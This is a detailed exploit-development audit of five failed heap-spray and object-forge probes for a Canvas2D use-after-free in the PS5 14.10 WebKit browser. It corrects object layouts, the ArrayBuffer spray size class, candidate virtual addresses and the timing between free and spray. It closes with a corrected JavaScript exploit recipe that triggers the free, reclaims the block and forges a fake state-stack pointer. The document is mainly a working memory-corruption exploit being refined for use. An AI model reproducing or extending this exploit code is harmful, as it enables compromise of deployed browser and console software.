# PS5 14.10 WebKit spray/forge audit — V872–V876

**Scope:** CVE-2026-43720 Canvas2D `getContext` reentrancy UAF; the five forge
probes V872–V876 for PS5 firmware 14.10 / WebKit 605.1.15.

**Basis:** the parameters in the task brief, the corrected constants supplied
with it, the WebKit reference tree in
`.webkit-src/Source/WebCore/html/canvas/`, the on-disk probe sources in
`~/Work/ps5-lan-research/ps5-webkit-remote-loader/`, and
`host-beacons.log`.

**Caveat on the on-disk probes:** `v872.html` is now a 146-byte redirect
(`V872-DEAD`), and the current `v873.html` is a different “timing-fix” build
from the one described in the brief. The audit follows the probe parameters
in the brief and uses the files/logs only to corroborate. The exact four
mistyped V873 zero counts are not recoverable from the current artifacts;
that is called out explicitly below.

---

## 0. Bottom line

All five probes fail for the **same two primary reasons**:

1. **Wrong spray primitive/size class.** A 748-character Latin-1 string
   requests a 768-byte `StringImpl` payload. The 768 class only has 752 bytes
   of usable payload once the allocator's 16-byte header/rounding is
   accounted for (and the PS5 `StringImpl` path also has the terminator/rounding
   byte). The request lands in the **next class** (832 in the 64-byte-step
   bmalloc table; 896 in coarser tables), not in the freed context's 768
   class. `ImageData` at 16×16 is 1024 payload bytes, also not 768.
   The correct spray is **`new ArrayBuffer(752)`**, viewed through a
   `Uint32Array`/`DataView`, which is exactly at the 752-byte payload ceiling.
   A string also puts the 20-byte `StringImpl` header at fake-object offsets
   `0..19`, so a string forge can never control the fake object's first 20
   bytes and every field is shifted by 20.

2. **Wrong `m_stateStack` offset.** The deployed 14.10 layout has
   `m_stateStack` at **`+120` (0x78)**, not `+112`. The `Vector` fields are
   **buffer `+120`, capacity `+128`, size `+132`**, and the inline `State`
   begins at `+136`. The old probes wrote buffer at `+112`, then wrote two
   `1` values at `+120`/`+124`. Under the corrected layout those two values
   are the **low and high halves of the buffer pointer**, so the real
   `m_buffer` becomes `0x0000000100000001` and the real `m_size` at `+132`
   stays `0`, which makes `last()` fail its bounds check before any candidate
   VA is dereferenced.

V875 is the only probe whose **cold-boot VA list is already the corrected
ten-entry list**. Its only fatal errors are the spray, the offset/forge
placement, the beacon/array allocations in the free-to-spray window, and the
cycling harness. It is the best first re-run.

---

## 1. Corrected constants

### 1.1 `CanvasRenderingContext2D` layout

`CanvasRenderingContext2DBase : public CanvasRenderingContext, public
CanvasPath` (`CanvasRenderingContext2DBase.h:92`). The first base subobject
is 40 bytes; the second is 80 bytes in the deployed 14.10 build
(`sizeof(PathSegment)=64`, `sizeof(CanvasPath)=80`, per the source analysis
that produced the correction). Therefore the first own member,
`Vector<State,1> m_stateStack`, is at:

```
+0    CanvasRenderingContext vptr / ScriptWrappable
+8    ScriptWrappable::m_wrapper
+16   CanMakeWeakPtr::m_weakPtrFactory
+24   CanMakeCheckedPtr::m_count
+28   m_hasActiveInspectorCanvasCallTracer (bool)
+32   m_canvas (CanvasBase&, 8)
+40   CanvasPath second-base vptr
+48   Path m_data (variant)
+120  m_stateStack.m_buffer          <-- corrected
+128  m_stateStack.m_capacity        (u32)
+132  m_stateStack.m_size            (u32)
+136  m_stateStack inline State[1]
...
+600  m_unrealizedSaveCount          (was +592 in the +112 layout)
+728  m_settings
~736  object end -> 704–768 bucket -> 768 class
```

The older +112 figure treated `Path` as 64 bytes and ignored the extra
variant index/padding in the deployed `PathSegment`/`Path` types. The local
`.webkit-src` reference tree computes a smaller `Path` for its own source
revision, which is why the older workspace docs landed on +112; do not use
that reference tree's `Path` size for the 14.10 build.

**Consequence for every probe:** the old “buffer at +112, size at +120,
capacity at +124” table is wrong in **both** respects — it is shifted by 8
and the capacity/size order is reversed. The two `1` values masked the
order error in the old layout, but under +120 they overwrite the pointer and
leave the real size zero.

### 1.2 `Vector` field order

`WTF::Vector` is (`Vector.h:395-397`):

```cpp
T* m_buffer;
unsigned m_capacity;
unsigned m_size;   // only used by the Vector subclass, placed here to avoid padding
```

So at `+120`: buffer, `+128`: capacity, `+132`: size. Writing “size” at
`+128` and “capacity” at `+132` is wrong for any vector operation that
distinguishes them (e.g. the `setLineDash` copy-assign).

### 1.3 Spray size class

The corrected empirical model: the 768 class has **752 bytes of payload**
after the 16-byte allocator header/rounding.

| Allocation | Requested payload | Effective class request | Class | Correct? |
|---|---:|---:|---:|---|
| `StringImpl`, 748 Latin-1 chars | 20 + 748 = 768 | 768 + 16 = 784 (plus terminator byte if reserved) | next class (832/896) | **No** |
| `getImageData(0,0,16,16)` pixel buffer | 16×16×4 = 1024 | 1024 + 16 = 1040 | 1152/1280 | **No** |
| `ArrayBuffer(752)` backing store | 752 | 752 + 16 = 768 | 768 | **Yes** |

A 732-character Latin-1 string (20 + 732 = 752) would fit the 752-byte
payload ceiling, but it still has the 20-byte `StringImpl` header skew and
is not recommended. Use distinct `ArrayBuffer(752)` allocations.

The `ArrayBuffer` path is also the right *shape*: because Gigacage is off on
this target, the backing store comes from the FastMalloc primary heap, the
same heap as the freed `CanvasRenderingContext2D` block. All JS allocations
are zero-initialized (`tryMalloc` + `memset(0)`), so the fake object starts
zeroed and only the fields you write are nonzero — which is what the forge
wants.

### 1.4 Corrected cold-boot VA list

All ten are canonical x86-64 user addresses (`< 0x0000800000000000`):

| # | Address | Size |
|---:|---|---:|
| 1 | `0x800000000` | 32 GiB |
| 2 | `0x1000000000` | 64 GiB |
| 3 | `0x2000000000` | 128 GiB |
| 4 | `0x8000000000` | 512 GiB |
| 5 | `0x10000000000` | 1 TiB |
| 6 | `0x40000000000` | 4 TiB |
| 7 | `0x100000000000` | 16 TiB |
| 8 | `0x400000000000` | 64 TiB |
| 9 | `0x600000000000` | 96 TiB |
| 10 | `0x7f0000000000` | 127 TiB |

`0x800000000000` is the first non-canonical address (bit 47 set, upper bits
clear); anything at or above it faults with #GP, not a normal page fault.
The old upper bound `0xFF0000000000` is 255 TiB and non-canonical. Do not
sweep a range; use only the ten known-mapped entries.

### 1.5 State offsets used by the getters

`m_buffer` points at the `State` base. The getter reads are:

| Getter | State offset | Width |
|---|---:|---:|
| `lineWidth` | +48 | 8 |
| `miterLimit` | +64 | 8 |
| `shadowOffsetX` | +72 | 4 |
| `shadowOffsetY` | +76 | 4 |
| `shadowBlur` | +80 | 4 |
| `globalAlpha` | +96 | 8 |
| `transform` | +112 | 48 |
| `lineDash` | +168 | 16 |
| `lineDashOffset` | +184 | 8 |
| `imageSmoothingEnabled` | +192 | 1 |

A mapped-zero VA therefore gives `lineWidth=0.0`, `globalAlpha=0.0`, an
all-zero transform (not the identity), and `imageSmoothingEnabled=false`.
That combination is the useful fingerprint; a single `0.0` is not.

---

## 2. Per-probe findings

Legend for **Alone?**:
- **No** — fixing only this parameter does not produce a PASS because another
  fatal parameter remains; it may change the crash signature.
- **Req.** — necessary in combination with the other fixes.
- **Yes** — fixing it alone changes the result in a meaningful way.
- **Already correct** — no change needed.

### 2.1 V872

Described probe: 748-byte Latin-1 string spray (`748 + 20 = 768`),
`getImageData(0,0,16,16)` (1024 B), `m_stateStack.m_buffer` at `+112`,
VA targets `0x800000000` through `0xFF0000000000`; 2400 copies via
`fs.slice(0)` in the on-disk family; six beacons between the free and the
spray.

| Parameter | V872 value | Correct value | Alone? | Why |
|---|---|---|---|---|
| Spray primitive | Latin-1 `StringImpl` | `ArrayBuffer(752)` + `Uint32Array` view | No | The 768-byte string request is not a 752-byte payload; next class. String header also skews every field by 20. |
| Spray length/count | 748 chars, 2400 `slice(0)` entries | 752-byte AB, 2400 distinct ABs | No | `slice(0)` returns the same JSString in JSC, so V872 creates **one** `StringImpl`, not 2400. Even if the class were right, one allocation can miss. |
| `getImageData(0,0,16,16)` | 1024-byte pixel buffer | remove; AB(752) is the spray | No | 1024 + header is 1152/1280, not 768. It can perturb the heap or steal the slot, and if called on the stale context it dereferences the freed object before allocating. |
| `m_stateStack.m_buffer` offset | `+112` (char 92) | `+120` (char 100 for a string; byte 120 for AB) | No | With the string reclaim, buffer at +112 is the old layout; with +120 it is 8 bytes early, in `Path` tail/padding. |
| Size/capacity placement | chars 100–107 = `1,0,0,0,1,0,0,0`; labelled size +120 / cap +124 | capacity `+128`, size `+132`; for a string chars 108–111 and 112–115; for AB `u32[32]=1`, `u32[33]=1` | No | Under +120 and the real Vector order, the two `1`s become the buffer's low/high dwords: `m_buffer=0x0000000100000001`, real size `0`. `last()` then fails the bounds check (SIGTRAP) before the VA is touched. |
| VA list/range | `0x800000000` through `0xFF0000000000`; V872-family table includes `0x100000000`, `0x200000000`, `0x400000000`, `0xFF0000000000` | the ten-entry list in §1.4 | No | The upper bound is non-canonical; the low entries are below the confirmed heap region. Only `idx=0` is ever tested because the 35 s meta refresh never fires after a ~50 ms crash. |
| Reclaim oracle | none; first `stale.lineWidth` is both the reclaim check and the VA test | `save()` ×42, scan AB at `+600` (`u32[150]`), then `restore()` ×42; or `getContextAttributes()` reading `+728` | Req. | A single SIGSEGV cannot distinguish “AB reclaimed and VA unmapped” from “AB missed and stale pointer garbage”. The non-faulting oracle is what makes the next runs interpretable. |
| Beacons in free→spray window | 6 `bea()` calls plus `new Array(748)`, fill loop, `L()` text growth | preallocate arrays; zero beacons; spray immediately | No | Each `bea()` builds strings/URLs and may allocate a 768-class object or trigger GC; any one steals the slot. `new Array(748)`/`fa` allocation also occurs after the free. |
| GC timing | 50×64 KiB + 100×128 KiB ABs after spray, before getters | remove or move after a successful getter | No | These are not 768-class and cannot reclaim; they can trigger GC and `visitAdditionalChildren` with `m_canvas=NULL`, which is untested. |
| Cycling | 35 s meta refresh; crash ~50 ms; only `idx=0` | rotate the next VA before the dangerous deref (cookie/server), or one VA per page load | No (diagnostic) | A SIGSEGV cannot run the meta refresh; the sweep never advances. |
| `m_canvas` | NULL (chars 12–19 zero) | avoid GC in the window; a valid live canvas if one is available | No | V861 only proved a non-NULL `m_canvas` survives GC; NULL is compiler-dependent. |

**V872 verdict:** the crash at `stale.lineWidth` is ambiguous between a
successful string reclaim + unmapped `0x800000000` and a missed reclaim.
The corrected spray and offset alone would change it to a `last()` bounds
trap because the size field would be zero. Only spray + offset + a mapped
zero VA + no beacon in the window gives a chance of PASS.

### 2.2 V873

Described probe: same 748-byte string spray, same `+112` offset, but the
strings/forge are pre-built **before** the UAF trigger; cold-boot VAs from
cobrajet with **four wrong zero counts**. The current on-disk `v873.html`
is a different build: it pre-builds `fg`, then calls
`String.fromCharCode.apply` after the free, sets only `fg[96]=0x08`, and has
no cold-boot VA table at all.

| Parameter | V873 value | Correct value | Alone? | Why |
|---|---|---|---|---|
| Spray primitive | Latin-1 `StringImpl` | `ArrayBuffer(752)` | No | Same size-class/header problem as V872. |
| Spray order | strings built before `getContext('bitmaprenderer')` | allocate the 752-byte spray **after** the free | No | A pre-built string is already allocated; the freed block cannot be filled by an object that already exists. V873’s zero-allocation window is the bug: it guarantees no reclaim. |
| `slice(0)` / distinct strings | `fa[i]=forgeStr.slice(0)` in the reviewed build | distinct allocations, one per slot | No | `slice(0)` returns the same JSString; the loop allocates nothing. The “2400 copies” are one object. |
| `+112` offset | buffer at char 92 / `+112` | buffer `+120`, capacity `+128`, size `+132` | No | Same shift/order error. In the current on-disk build, `fg[96]=0x08` writes object `+116`, which is **not** the buffer at all under +120; the `fg[100..107]` writes become `m_buffer=0x0000000100000001` and the real size stays 0. |
| Cold-boot VAs | 10 entries, four with wrong zero counts | §1.4 ten-entry list | No | A wrong zero count is a 16× displacement; the address is usually unmapped or in a different mapping. The exact four are not in the current artifact; the old V872-family review identifies `VA-0100`/`VA-0200`/`VA-0400`/`VA-FF00` as outside the confirmed range. Replace the whole table, do not patch four cells. |
| Beacons in window | none in the current build | keep it that way; preallocate everything | — | V873 got this part right. The problem is that “no allocation” was achieved by pre-building, which is the opposite of a spray. |
| GC timing | 50×64 KiB after spray, before getters | remove or move after getter | No | Same GC/`m_canvas` risk. |
| Cycling | 45 s meta refresh | rotate before deref | No | Crash occurs before refresh. |

**V873 verdict:** the “timing fix” fixed the wrong half. Zero allocations
between free and spray is necessary, but V873 also has **zero 768-class
allocations after the free**, so it cannot reclaim. With a correct AB spray
after the free, the UAF block can be filled; with the old +112 forge, the
real size is still zero and `last()` still traps.

### 2.3 V874

Described probe: APNG heap pointer (`Ph`) used as `m_stateStack.m_buffer`
instead of a hardcoded VA; same string spray.

| Parameter | V874 value | Correct value | Alone? | Why |
|---|---|---|---|---|
| Spray primitive | Latin-1 `StringImpl` | `ArrayBuffer(752)` | No | Same class/header problem. |
| `m_buffer` target | leaked APNG heap pointer `Ph` | a verified mapped-zero cold-boot VA, or a controlled AB whose address is known | No | `Ph` is a leaked pointer into image-related heap memory, not a zeroed 448-byte `State`. It may be freed after `drawImage`/`getImageData`, and the scan that produces it can match a pixel color, not a pointer. It is the wrong *kind* of target even if it is a real address. |
| `Ph` placement | `fg[92..99]=Ph` at fake object `+112..119` | `fg[100..107]=Ph` at `+120..127`; capacity `+128`, size `+132` | No | The leaked pointer goes 8 bytes too early, into `Path` tail/padding. The `fg[100..107]=1` then overwrites the real buffer with `0x0000000100000001`, and size stays 0. |
| APNG leak allocation | `getImageData(0,0,W,1)` with `W=512` | keep the leak phase separate; account for 2048 B and decode allocations | No | 512×1×4 = 2048 B, plus headers; it is not a 768-class spray and it shapes the heap before the UAF. |
| Candidate validation | scan for `hi` in `0x08..0x20`, `lo>0x1000` | validate the candidate with a non-faulting read or a known tag | No | Pixel data can satisfy the range; a false `Ph` faults when used. |
| Beacons in window | `B-UAF` plus `new Array(748)`/fill | no beacons, preallocated arrays | No | One beacon can steal the slot; the array allocation is after the free. |
| GC timing | 50×64 KiB after spray | remove or move | No | Same GC/`m_canvas` risk. |
| Cycling | 55 s meta refresh | rotate before deref | No | Crash occurs before refresh. |

**V874 verdict:** an APNG pointer is not a drop-in replacement for a
cold-boot VA. It is a heap pointer to data the probe does not control and
may not keep alive. Even after fixing the spray and offset, pointing
`m_buffer` at `Ph` is likely to read garbage or crash; the correct bootstrap
is a mapped-zero VA (or a self-referential AB once its address is known).

### 2.4 V875

Described probe: sweep of ten cold-boot VAs; same string spray.

| Parameter | V875 value | Correct value | Alone? | Why |
|---|---|---|---|---|
| VA list | ten entries: `0x800000000`, `0x1000000000`, `0x2000000000`, `0x8000000000`, `0x10000000000`, `0x40000000000`, `0x100000000000`, `0x400000000000`, `0x600000000000`, `0x7f0000000000` | identical | **Already correct** | V875’s table is exactly the corrected list. No VA change needed. |
| Spray primitive | Latin-1 `StringImpl` | `ArrayBuffer(752)` | No | Same class/header problem. |
| `m_buffer` offset | `fg[92..99]=VA` at `+112` | `fg[100..107]=VA` at `+120` | No | The VA never reaches the real buffer. |
| Size/capacity | `fg[100..107]=1,0,0,0,1,0,0,0` at `+120/+124` | capacity `+128` (chars 108–111), size `+132` (chars 112–115) | No | The `1`s become the real buffer’s low/high dwords (`0x0000000100000001`) and the real size stays 0. `last()` traps. |
| Beacons in window | `UAF` and `FORGE` plus `new Array(748)`/fill | no beacons, preallocate | No | Same slot-steal/GC risk. |
| GC timing | 50×64 KiB after spray | remove or move | No | Same. |
| Cycling | 6 s `setTimeout` after the getter | rotate before deref | No (diagnostic) | If `lineWidth` SIGSEGVs, the timeout is never reached; only `idx=0` runs. |

**V875 verdict:** the closest probe to working. Its VA table is already
right. Fix the spray, the offset/forge placement, the beacons, and the
cycling; then it has a real chance of PASS on one of the ten VAs.

### 2.5 V876

Described probe: FreeBSD shared page `0x7FFFFFFFE000` as `m_buffer`; same
string spray. The probe also tries `0x7FFFFFFFD000` and user stack
`0x7FFFFFFFF000`.

| Parameter | V876 value | Correct value | Alone? | Why |
|---|---|---|---|---|
| Spray primitive | Latin-1 `StringImpl` | `ArrayBuffer(752)` | No | Same class/header problem. |
| `m_buffer` target | `0x7FFFFFFFE000` (shared page), plus `0x7FFFFFFFD000`, `0x7FFFFFFFF000` | a mapped-zero cold-boot VA from §1.4 | No | The shared page is a mapped read-only trampoline/VDSO page, not a zeroed `State`. `lineWidth` at `+48` reads code bytes, not `0.0`; any write to the state would fault. The user stack is likewise not a `State`. |
| Forge placement | `fg[92+j]=tgt.b[j]` at `+112..119` | `fg[100+j]` at `+120..127`; capacity `+128`, size `+132` | No | Same 8-byte shift; the `1` writes then produce `m_buffer=0x0000000100000001`, size 0. |
| Canonicality | `0x7FFFFFFFE000`, `0x7FFFFFFFF000` are canonical | — | — | They are canonical and may be mapped, which is why the probe can log `MAPPED`; mapping is not the same as a usable zero `State`. |
| Beacons in window | `UAF` plus `new Array(748)`/fill | no beacons, preallocate | No | Same. |
| GC timing | 50×64 KiB after spray | remove or move | No | Same. |
| Cycling | 45 s meta refresh | rotate before deref | No | Crash occurs before refresh. |

**V876 verdict:** the shared page can avoid a page fault but cannot supply a
valid zero `State`. With the corrected spray/offset it would read trampoline
bytes; with the current offset it traps at size 0 before the read. It is a
useful *mapping* test, not a forge target.

---

## 3. Other errors the original parameter list did not call out

### 3.1 Beacon allocations between free and spray

Every `bea()` does much more than send a request:

```js
var s=('000'+B).slice(-3); B++;
var path='/beacon/'+PRE+'-'+s+'-'+tag+'?d='+encodeURIComponent(String(d||''))+'&t='+Date.now();
L(tag+' '+d);                       // LOG.textContent += ... (growing string)
navigator.sendBeacon(path);         // URL parse, ping/request objects
new Image().src=path;               // fallback: image loader objects
```

Any of those can allocate a 768-class block or trigger GC. The table is:

| Probe | Beacon calls between free and first spray allocation | Other allocations in the same window |
|---|---|---|
| V872 | 6 (`UAF-RESULT`, `FORGE-BUILD`, `FORGE-CALLTRACER`, `FORGE-MCANVAS`, `FORGE-STBUF`, `FORGE-STSIZE`) | `new Array(748)`, fill loop, `fa` array (~2400 slots) |
| V873 | 0 (current build) | pre-built `fg`; `String.fromCharCode` after free; `fa` preallocated |
| V874 | 1 (`B-UAF`) | `new Array(748)`, fill, `fa` array |
| V875 | 2 (`UAF`, `FORGE`) | `new Array(748)`, fill, `fa` array |
| V876 | 1 (`UAF`) | `new Array(748)`, fill, `fa` array |

The fix is not “send fewer beacons”; it is **zero beacons and zero JS
allocations** between the `getContext('bitmaprenderer')` return and the
first `new ArrayBuffer(752)`. Preallocate the spray array and any forge
arrays before the trigger; buffer beacon text in a preallocated array and
flush after the getter.

### 3.2 GC timing

- The 50×64 KiB and 100×128 KiB `ArrayBuffer` pushes are **not** 768-class
  and cannot reclaim the freed context. They are pure GC pressure.
- Applied after the spray and before the getters, they can only hurt: they
  may run `visitAdditionalChildren` on the stale JS wrapper, which reads
  `m_canvas`. V872–V876 all leave `m_canvas` NULL. V861 only proved the
  non-NULL case; NULL is compiler-dependent.
- GC can also run during the `new Array(748)`/beacon allocations **before**
  the spray, freeing or reusing the just-freed block. There is no way to
  make that deterministic; remove the allocations.
- If a survival test is wanted, do it **after** the getter has returned
  `0.0` and the reclaim is proven, not before.

### 3.3 Forge byte layout

- **String header skew.** `StringImpl` is 20 bytes (`m_refCount` 0,
  `m_length` 4, data pointer 8, `m_hashAndFlags` 16; chars at 20). A string
  char index `N` is fake-object offset `20+N`. The old probes correctly
  subtract 20 for the +112 table, but the corrected +120 needs char 100,
  not char 92. With the AB spray there is no header; byte 120 is the field.
- **Capacity/size order.** `Vector` is buffer, capacity, size. The old
  “size at +120, capacity at +124” is reversed. Both values were `1`, so
  the old +112 probe was masked; under +120 the same writes destroy the
  pointer and leave size 0.
- **Trailing offsets shift by 8.** `m_unrealizedSaveCount` is `+600`, not
  `+592`; `m_settings` is `+728`, not `+720`. Any save-count oracle or
  zeroing at `+592` is now reading `m_dirtyRect` high bytes.
- **vptr fields.** `+0` and `+40` can stay zero for the getter path because
  the IDL getters are non-virtual, but any virtual call or type check would
  need valid vptrs. Do not use `instanceof`/`is2d` on the fake object.
- **DAZ.** Do not write pointer bits through `Float64Array` arithmetic. Use
  `DataView.setBigUint64(120, va, true)` or `Uint32Array` low/high words.
  A raw 64-bit VA is a subnormal double; DAZ can flush it in comparisons,
  and a `Float64Array` round-trip is the wrong tool for exact bits.
- **Zero-init is your friend.** The AB backing is zeroed by the engine, so
  `m_canvas`, `m_path`, `m_unrealizedSaveCount`, and all unset State fields
  are already zero. Write only `+32` (m_canvas, if needed), `+120` (buffer),
  `+128` (capacity), `+132` (size), and `+600` (save count) if using the
  oracle.
- **`m_size=0` is a trap, not a read.** `Vector::last()` is
  `at(size()-1)` with a bounds check. A zero size calls
  `CrashOnOverflow::overflowed()`/`CRASH()`; on this target that is a
  SIGTRAP, not the SIGSEGV you are looking for. This is why several probes
  can “crash at `lineWidth`” without ever touching the candidate VA.

### 3.4 Harness/cycling

- V872 uses a 35 s meta refresh and crashes in ~50 ms; only `idx=0` is ever
  tested. The beacon log shows repeated `idx=0/10` runs, confirming this.
- V875 uses a 6 s `setTimeout` placed *after* the getter; a SIGSEGV in the
  getter never reaches it.
- V876 uses a 45 s meta refresh and a post-getter `location.replace`.
- V873 uses a 45 s meta refresh.
- A crash cannot run page JS, so the next index must be committed **before**
  the dangerous dereference (cookie/localStorage set before the read, or a
  host-side rotation). One VA per page load is the cleanest.

### 3.5 Diagnostic ambiguity

A single SIGSEGV at `stale.lineWidth` is consistent with:

1. the AB reclaimed the slot, `m_buffer` is the candidate VA, and the VA is
   unmapped;
2. the AB missed the slot, and the stale object's `m_buffer` is garbage;
3. the AB reclaimed but the offset is wrong, so the real `m_size` is 0 and
   `last()` traps.

The probes cannot distinguish these because the first getter is both the
reclaim oracle and the VA test. Add the non-faulting oracle first:

```js
// after the AB spray, before any VA dereference
for (let k = 0; k < 42; k++) stale.save();       // +600++
let winner = -1;
for (let i = 0; i < N; i++) if (u32[i][150] === 42) { winner = i; break; }
for (let k = 0; k < 42; k++) stale.restore();    // +600--
```

`save()`/`restore()` do not touch `m_stateStack` or `m_canvas`; they only
increment/decrement `m_unrealizedSaveCount` at `+600`. Finding the winner
this way lets you forge only that AB, and lets you report “no reclaim”
instead of a bare crash. `getContextAttributes()` (reads only `m_settings`
at `+728`) is a second safe oracle.

---

## 4. Would fixing it change the outcome?

| Fix | V872 | V873 | V874 | V875 | V876 |
|---|---|---|---|---|---|
| AB(752) spray | Req. | Req. | Req. | Req. | Req. |
| +120/+128/+132 forge | Req. | Req. | Req. | Req. | Req. |
| Remove `getImageData` | Req. | — | Req. | — | — |
| Correct VA table | Req. | Req. | — | already correct | — |
| Replace APNG/shared-page target | — | — | Req. | — | Req. |
| Spray after free / distinct allocations | Req. | Req. | Req. | Req. | Req. |
| Zero beacons in window | Req. | Req. | Req. | Req. | Req. |
| No GC before getter | Req. | Req. | Req. | Req. | Req. |
| Cycling before deref | Req. | Req. | Req. | Req. | Req. |

“Req.” means necessary in combination; **none of these alone** produces a
PASS. The minimum viable fix set is:

1. **V875:** AB(752), +120/+128/+132, no beacons, no GC, rotate before
   deref. Its VAs are already right. Re-run this first.
2. **V872:** the above plus the corrected VA table and removal of the
   `getImageData`/`slice(0)`/six-beacon path.
3. **V873:** the above plus spray-after-free (not pre-built), distinct
   allocations, and the corrected VA table.
4. **V874:** the above plus replacing the APNG pointer with a verified
   mapped-zero VA (or proving the APNG target is a live, controlled State).
5. **V876:** the above plus replacing the shared page/stack with a
   mapped-zero VA.

### 4.1 What a single fix alone would look like

| Single fix | Expected result |
|---|---|
| `AB(752)` only | If the AB reclaims, the old `+112` writes put the two `1`s into the real `+120` pointer and leave size `0`; `last()` traps (SIGTRAP). If the AB misses, the observed SIGSEGV is unchanged. |
| `+120/+128/+132` only | The string spray still lands in the next class and does not occupy the slot; the corrected writes go into a string that is not the stale object. Unchanged crash. |
| Correct VA list only | The candidate is never reached because the forge still does not map to `+120` with size 1. Unchanged crash. |
| Remove `getImageData` only | Removes a 1024-byte wrong-class allocation and heap noise, but the string still misses the 768 slot. Unchanged. |
| Zero beacons / no GC only | Removes the most likely slot thieves and the GC/`m_canvas` risk, so the crash becomes more reproducible, but the spray/offset are still wrong. No PASS. |
| Spray after free only (V873) | Puts a 768-byte request after the free, but it is still the wrong class; no reclaim. Unchanged. |
| Cycling fix only | Lets all ten VAs run, but every one uses the wrong spray/offset; all ten fail. |

This is why the fixes have to be applied as a set, and why V875 is the
cheapest probe to validate the set: its VA table is already correct.

---

## 5. Corrected probe recipe

```js
// ---- before the trigger: no strings, no ImageData, no beacons ----
const N = 2400;                 // 2400 * 752 = 1.8 MB, far below 768 MB
const abs = new Array(N);       // preallocate the slots; no growth after free
const u32 = new Array(N);

// ---- trigger with ZERO saves (keep m_stateStack inline) ----
let stale = null;
const opts = {};
Object.defineProperty(opts, 'alpha', {
  get() { stale = oc.getContext('2d'); return true; },
  configurable: true
});
oc.getContext('bitmaprenderer', opts);
oc = null;

// ---- spray immediately: no beacons, no GC, no array growth ----
for (let i = 0; i < N; i++) abs[i] = new ArrayBuffer(752);
for (let i = 0; i < N; i++) u32[i] = new Uint32Array(abs[i]);

// ---- forge every AB (or forge the winner after the save oracle) ----
const VA = 0x800000000n;
for (let i = 0; i < N; i++) {
  const u = u32[i];
  u[7] = 0;                                  // +28 CallTracer = 0
  u[8] = 0; u[9] = 0;                        // +32 m_canvas = 0 (or a live canvas)
  u[30] = Number(VA & 0xffffffffn);          // +120 low dword of m_buffer
  u[31] = Number((VA >> 32n) & 0xffffffffn); // +124 high dword
  u[32] = 1;                                 // +128 capacity
  u[33] = 1;                                 // +132 size
  u[150] = 0;                                // +600 m_unrealizedSaveCount
}

// ---- optional non-faulting reclaim oracle (see §3.5) ----
// for (let k=0;k<42;k++) stale.save();
// find i with u32[i][150]===42; then for (let k=0;k<42;k++) stale.restore();

// ---- only now dereference ----
try {
  const lw = stale.lineWidth;   // reads 8 bytes at VA+48
  // 0.0 => mapped zero; SIGSEGV => unmapped or wrong reclaim
} catch (e) { /* JS exception, not a SIGSEGV */ }
```

Important details:

- `u[30]`/`u[31]` are `+120`/`+124`; `u[32]` is `+128` capacity; `u[33]` is
  `+132` size.
- `u[7]` covers bytes `28..31`; `u[8]`/`u[9]` cover `m_canvas` at `32..39`.
- `u[150]` covers `+600..603`.
- Do not use `Float64Array` for `VA`; use `BigUint64Array`/`DataView` or the
  two `Uint32Array` words above.
- Create the views **after** all ABs are allocated. A view allocation
  between ABs is small, but it is still an uncontrolled allocation in the
  free→spray window.
- If you use the save oracle, `restore()` the same count before any
  `setLineDash`/`lineWidth` write; otherwise `realizeSaves()` will append
  states through the forged `m_buffer` and write `n*448` bytes to the
  target.

---

## 6. Evidence, confidence, and open items

**Confirmed from the reference source / arithmetic:**

- `CanvasRenderingContext2DBase` inherits `CanvasRenderingContext` and
  `CanvasPath`; the second base contains a variant `Path`; the first own
  member is `m_stateStack` (`CanvasRenderingContext2DBase.h:92,436`,
  `CanvasPath.h`, `Path.h`, `PathSegment.h`).
- `WTF::Vector` order is buffer, capacity, size (`Vector.h:395-397`).
- `StringImpl` is 20 bytes to the inline chars (`m_refCount` 0,
  `m_length` 4, data 8, `m_hashAndFlags` 16, chars 20;
  `StringImpl.h:144-167,1192`).
- 16×16 `ImageData` is 1024 payload bytes; 512×1 is 2048.
- The ten corrected VAs are canonical; `0xFF0000000000` is not.
- V875’s table matches the corrected ten-entry list exactly.

**Empirical / supplied correction (not re-proved here):**

- The 768 class has a 752-byte payload ceiling after the allocator
  header/rounding. The local `.webkit-src` libpas source rounds to 16-byte
  granules and does not itself show the 16-byte header, so treat 752/768 as
  the collaborator’s measured correction, not as a claim derived from that
  tree alone.
- The deployed 14.10 `sizeof(PathSegment)=64` / `sizeof(CanvasPath)=80`.
  The local reference tree computes a smaller `Path`, which is why the older
  docs say +112; the corrected +120 is the deployed value supplied with the
  task.

**Not recoverable from the current artifacts:**

- The exact four V873 entries with wrong zero counts. The current
  `v873.html` has no cold-boot VA table; `v872.html` is a dead redirect.
  The old V872-family review names `VA-0100`/`VA-0200`/`VA-0400`/`VA-FF00`
  as outside the confirmed range, which is the most likely source of the
  four. Replace the whole table; do not patch four cells.
- The exact V872 source. The beacon log shows `char92-99 =
  0x0000000800000000`, `char100-107 = size1+cap1`, `idx=0/10`, and
  `crc2d+112` labels, which is enough to reconstruct the old layout used in
  the table above.

**Recommended next run order:** V875 (smallest fix set, VAs already correct)
→ V872 with the corrected table → V873 with spray-after-free → V876 with a
zero VA → V874 only after the APNG leak target is independently validated.
